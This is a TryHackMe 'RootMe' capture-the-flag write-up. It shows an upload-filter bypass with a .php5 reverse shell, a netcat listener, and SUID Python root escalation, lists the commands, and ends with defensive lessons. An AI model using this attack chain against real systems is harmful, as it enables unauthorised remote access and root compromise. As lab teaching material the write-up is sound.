# RootMe - TryHackMe Writeup

## Overview

This room covered web enumeration, file upload exploitation, reverse shell access, and Linux privilege escalation through a misconfigured SUID binary.

The objective was to gain initial access through the web server, retrieve the user flag, escalate privileges to root, and capture the root flag.

## Attack Path

1. Scanned the target with Nmap and found SSH on port `22` and Apache HTTP on port `80`.
2. Enumerated web directories with Gobuster.
3. Discovered `/panel/` and `/uploads/`.
4. Identified the upload panel as the main attack surface.
5. Prepared a PHP reverse shell and changed the extension to `.php5` to bypass weak filtering.
6. Started a Netcat listener and uploaded the payload through `/panel/`.
7. Triggered the payload from `/uploads/` and received a shell as `www-data`.
8. Located and read the user flag from `/var/www/user.txt`.
9. Enumerated SUID binaries and found `/usr/bin/python2.7`.
10. Used the SUID Python GTFOBins technique to spawn a root shell.
11. Read the root flag from `/root/root.txt`.

## Key Commands

```bash
nmap -sC -sV -Pn 10.48.155.140
gobuster dir -u http://10.48.155.140 -w /usr/share/wordlists/dirb/common.txt
locate php-reverse-shell.php
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php5
nc -lvnp 4444
find / -name user.txt 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh","sh","-p")'
cat /root/root.txt
```

## Findings

| Weakness | Impact |
|---|---|
| Exposed upload panel | Allowed attacker-controlled file upload |
| Weak extension filtering | Allowed PHP execution with `.php5` |
| Web-accessible uploads directory | Allowed payload execution from the browser |
| SUID bit set on Python | Allowed privilege escalation to root |

## Lessons Learned

- File upload functionality should be tested for extension bypasses and executable payloads.
- Uploaded files should not be stored in a web-executable location.
- Extension blacklists are weaker than strict allowlists.
- SUID binaries should be audited regularly.
- GTFOBins is useful for identifying privilege escalation techniques for misconfigured binaries.

## Reference

- [GTFOBins - Python SUID](https://gtfobins.github.io/gtfobins/python/#suid)
